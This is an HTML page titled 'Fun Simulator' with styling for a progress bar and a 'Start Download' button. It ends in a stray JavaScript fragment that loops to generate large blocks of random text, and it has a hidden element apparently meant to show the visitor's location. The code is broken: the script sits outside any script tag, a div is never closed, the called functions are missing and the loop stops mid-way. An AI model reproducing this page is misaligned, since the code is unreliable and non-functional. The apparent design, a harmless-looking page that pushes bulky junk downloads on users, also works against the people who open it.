<!DOCTYPE html>
<html>
<head>
  <title>Fun Simulator</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      text-align: center;
      padding: 20px;
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      max-width: 400px;
      width: 80%;
    }

    .progress-bar {
      width: 100%;
      background-color: #f1f1f1;
      border-radius: 10px;
      margin-top: 20px;
    }

    .progress {
      width: 0;
      height: 30px;
      background-color: #4CAF50;
      text-align: center;
      line-height: 30px;
      color: white;
      border-radius: 10px;
      transition: width 0.3s ease;
    }

    button {
      background-color: #4CAF50;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 20px;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #45a049;
      transform: scale(1.1);
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
    }

    h1 {
      margin-bottom: 20px;
      color: #333;
    }

    p {
      margin-top: 20px;
    }

  </style>
</head>
<body>
  <div class="container">
    <h1>Fun Simulator</h1>
    <div class="progress-bar">
      <div class="progress">0%</div>

    <br>
    <button onclick="downloadFiles()">Start Download</button>
    <p id="locationDisplay" style="display:none;"></p>

      for (var i = 0; i < length; i++) {

            var data = generateRandomText(690092); // 3 times bigger
